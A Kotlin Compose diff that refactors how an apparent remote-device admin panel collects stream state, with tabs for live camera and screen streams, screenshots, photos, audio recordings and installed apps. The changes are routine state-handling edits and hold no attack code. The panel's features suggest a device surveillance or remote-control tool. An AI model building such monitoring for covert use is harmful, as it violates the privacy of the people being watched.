@@ -1852,8 +1852,7 @@ fun AudioRecordRequirementsPage(viewModel: AdminViewModel) {
 
 @Composable
 fun RemoteControlTab(viewModel: AdminViewModel) {
-    val liveStreamState by viewModel.liveStreamState.collectAsState()
-    val isStreamingActive = liveStreamState?.isActive == true
+    val isStreamingActive by remember(viewModel) { viewModel.liveStreamState.map { it?.isActive == true }.distinctUntilChanged() }.collectAsState(initial = false)
     var controlContainerSize by remember { mutableStateOf(IntSize.Zero) }
 
     Column(
@@ -2134,11 +2133,9 @@ fun NotificationTab(viewModel: AdminViewModel) {
 
 @Composable
 fun CameraLiveTab(viewModel: AdminViewModel) {
-    val cameraStreamState by viewModel.cameraStreamState.collectAsState()
-    val isStreamingActive = cameraStreamState?.isActive == true
-    val isLoading = cameraStreamState?.isLoading == true
-    val image = cameraStreamState?.image
-    val error = cameraStreamState?.error
+    val isStreamingActive by remember(viewModel) { viewModel.cameraStreamState.map { it?.isActive == true }.distinctUntilChanged() }.collectAsState(initial = false)
+    val isLoading by remember(viewModel) { viewModel.cameraStreamState.map { it?.isLoading == true }.distinctUntilChanged() }.collectAsState(initial = false)
+    val error by remember(viewModel) { viewModel.cameraStreamState.map { it?.error }.distinctUntilChanged() }.collectAsState(initial = null)
     
     val bitmap by produceState<Bitmap?>(initialValue = null, viewModel) {
         viewModel.cameraStreamState.map { it?.image }.distinctUntilChanged().conflate().collect { imgStr ->
@@ -2319,10 +2316,9 @@ fun CameraLiveTab(viewModel: AdminViewModel) {
 
 @Composable
 fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
-    val liveStreamState by viewModel.liveStreamState.collectAsState()
-    val isStreamingActive = liveStreamState?.isActive == true
-    val isLoading = liveStreamState?.isLoading == true
-    val error = liveStreamState?.error
+    val isStreamingActive by remember(viewModel) { viewModel.liveStreamState.map { it?.isActive == true }.distinctUntilChanged() }.collectAsState(initial = false)
+    val isLoading by remember(viewModel) { viewModel.liveStreamState.map { it?.isLoading == true }.distinctUntilChanged() }.collectAsState(initial = false)
+    val error by remember(viewModel) { viewModel.liveStreamState.map { it?.error }.distinctUntilChanged() }.collectAsState(initial = null)
     var showFullscreenBitmap by remember { mutableStateOf<Bitmap?>(null) }
 
     Column(
@@ -2730,7 +2726,8 @@ fun GeneralStatusTab(device: Device, viewModel: AdminViewModel) {
 fun RemoteCommandCenterTab(viewModel: AdminViewModel) {
     val screenshots by viewModel.screenshots.collectAsState()
     val cameraPhotos by viewModel.cameraPhotos.collectAsState()
-    val liveStreamState by viewModel.liveStreamState.collectAsState()
+    val isStreamingActive by remember(viewModel) { viewModel.liveStreamState.map { it?.isActive == true }.distinctUntilChanged() }.collectAsState(initial = false)
+    val isLoading by remember(viewModel) { viewModel.liveStreamState.map { it?.isLoading == true }.distinctUntilChanged() }.collectAsState(initial = false)
     val audioRecords by viewModel.audioRecords.collectAsState()
     val cameraVideos by viewModel.cameraVideos.collectAsState()
     val installedApps by viewModel.installedApps.collectAsState()
@@ -2782,8 +2779,6 @@ fun RemoteCommandCenterTab(viewModel: AdminViewModel) {
             when (activeCommandSubIndex) {
                 0 -> {
                     // SCREENSHOT AND PHOTO DISPATCH PANEL
-                    val isStreamingActive = liveStreamState?.isActive == true
-                    val isLoading = liveStreamState?.isLoading == true
                     Column(
                         modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()),
                         verticalArrangement = Arrangement.spacedBy(16.dp)
